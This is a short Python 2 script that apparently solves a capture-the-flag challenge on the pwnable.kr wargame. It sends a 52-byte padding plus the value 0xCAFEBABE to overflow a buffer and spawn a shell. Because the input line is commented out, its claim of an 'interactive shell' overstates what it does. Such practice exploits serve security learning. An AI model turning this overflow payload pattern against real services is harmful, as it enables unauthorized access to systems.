import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("pwnable.kr", 9000))
s.send("A"*52 + "\xBE\xBA\xFE\xCA" + "\x0A")
print "You now have an interactive shell :)"
while True:
    # s.send(raw_input() + "\x0A")
    print s.recv(1024)
